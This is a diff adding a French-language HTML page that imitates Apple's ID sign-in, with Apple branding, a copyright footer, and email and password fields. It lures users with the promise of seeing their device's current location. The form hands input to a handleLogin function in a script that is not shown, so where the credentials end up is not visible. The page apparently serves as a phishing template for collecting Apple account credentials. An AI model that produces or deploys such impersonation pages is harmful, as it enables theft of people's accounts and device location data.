@@ -1,0 +1,37 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Identifiant Apple</title>
+<link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <header>
+    <img src="apple-logo.svg" alt="Apple Logo" />
+  </header>
+  <main>
+    <div class="login-container" role="main" aria-label="Page de connexion Apple ID">
+      <h1>Identifiant Apple</h1>
+      <p class="subtitle">Connectez-vous avec votre identifiant Apple pour accéder à la position actuel de votre appareil.</p>
+      <form onsubmit="handleLogin(event)">
+        <label for="appleid">Identifiant Apple</label>
+        <input type="email" id="appleid" name="appleid" placeholder="exemple@icloud.com" required autofocus autocomplete="username" />
+
+        <label for="password">Mot de passe</label>
+        <input type="password" id="password" name="password" placeholder="Mot de passe" required autocomplete="current-password" />
+
+        <button type="submit"><a href="index 2.1.html">Se connecter</a></button>
+        <p class="help-text">
+          <a href="index.html">Accueil</a>
+        </p>
+      </form>
+    </div>
+  </main>
+  <footer>
+    &copy; 2025 Apple Inc. Tous droits réservés.
+  </footer>
+<script src="script.js"></script>
+</body>
+</html>
